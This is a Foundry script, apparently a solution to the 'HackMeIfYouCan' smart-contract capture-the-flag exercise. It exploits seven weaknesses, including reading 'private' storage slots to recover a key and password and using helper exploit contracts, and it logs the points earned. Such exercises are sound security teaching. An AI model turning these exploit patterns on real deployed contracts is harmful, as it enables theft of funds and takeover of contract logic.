// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;
pragma experimental ABIEncoderV2;

import "../src/HackMeIfYouCan.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/Proxy.sol";
import "../src/ExploitBuilding.sol";

contract HackMeIfYouCanSolution is Script {
    HackMeIfYouCan public HMIYC;
    Proxy public proxy;
    ExploitBuilding public building;

    function run() external {
        console.log("Solving HackMeIfYouCan...");
        uint256 id;
        assembly {
            id := chainid()
        }
        if (id == 11155111) {
            HMIYC = HackMeIfYouCan(0x9D29D33d4329640e96cC259E141838EB3EB2f1d9);
        } else {
            vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
            bytes32[15] memory data;
            for (uint256 i = 0; i < 15; i++) {
                bytes32 value = bytes32("bogoss");
                data[i] = value;
            }
            HMIYC = new HackMeIfYouCan(bytes32("double-bogoss"), data);
            vm.stopBroadcast();
        }
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // Reponse pour la 1er fonction
        HMIYC.flip(false);
        console.log(
            "1st - I think +4 points :",
            HMIYC.getMarks(vm.envAddress("WALLET_ADDRESS"))
        );

        // Reponse pour la 2e fonction
        proxy = new Proxy(address(HMIYC));
        proxy.addpoint();
        console.log(
            "2nd - I think +1 point :",
            HMIYC.getMarks(vm.envAddress("WALLET_ADDRESS"))
        );

        // Reponse pour la 3e fonction
        HMIYC.transfer(address(0), 123);
        console.log(
            "3th - I think +1 point :",
            HMIYC.getMarks(vm.envAddress("WALLET_ADDRESS"))
        );

        // Reponse pour la 4e fonction
        building = new ExploitBuilding(address(HMIYC));
        building.exploitGoTo();
        console.log(
            "4th - I think +4 points :",
            HMIYC.getMarks(vm.envAddress("WALLET_ADDRESS"))
        );

        // Reponse pour la 5e fonction
        bytes32 data = vm.load(address(HMIYC), bytes32(uint256(16)));
        HMIYC.sendKey(bytes16(data));
        console.log(
            "5th - I think +4 point :",
            HMIYC.getMarks(vm.envAddress("WALLET_ADDRESS"))
        );

        // Reponse pour la 6e fonction
        data = vm.load(address(HMIYC), bytes32(uint256(3)));
        HMIYC.sendPassword(data);
        console.log(
            "6th - I think +3 point :",
            HMIYC.getMarks(vm.envAddress("WALLET_ADDRESS"))
        );

        // Reponse pour la 7e fonction
        HMIYC.contribute{value: 0.0009 ether}();
        address(HMIYC).call{value: 0.001 ether}("");
        console.log(
            "7th - I think +3 point :",
            HMIYC.getMarks(vm.envAddress("WALLET_ADDRESS"))
        );
    }
}
